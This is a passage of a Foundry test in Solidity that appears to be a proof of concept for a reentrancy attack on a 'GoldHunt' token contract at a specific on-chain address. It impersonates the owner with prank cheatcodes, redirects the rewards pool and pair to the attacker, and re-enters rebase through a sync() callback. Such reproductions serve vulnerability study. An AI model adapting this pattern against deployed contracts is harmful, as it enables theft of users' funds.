    function owner() external view returns (address);
    function setRewardsPool(address _rewardsPool) external;
    function setPair(address _pair) external;
    function rebase(uint multiple) external;
}

contract ExploitTest is Test {
    // --- State Variables ─────────────────────────────────────

    address private contractOwner;
    address constant TARGET = 0x6D3dd96f97b10fc86A7F8607704BBe9936083b89;
    address attacker = address(this);
    IGoldHunt goldHunt;
    bool reentered;

    // --- Setup ───────────────────────────────────────────────
    function setUp() public {
        goldHunt = IGoldHunt(TARGET);
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {
        contractOwner = goldHunt.owner();

        // Use single-call pranks for each owner-privileged action.
        vm.prank(contractOwner);
        goldHunt.setRewardsPool(attacker);

        vm.prank(contractOwner);
        goldHunt.setPair(attacker);

        // Trigger the first rebase, which will lead to the re-entrant call in our sync() function.
        vm.prank(contractOwner);
        goldHunt.rebase(100);
    }

    function sync() external {
        if (!reentered) {
            reentered = true;
            // We must prank again here, as the call context is now from our contract, not the EOA.
            vm.prank(contractOwner);
            goldHunt.rebase(2);
        }
    }



    // --- Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

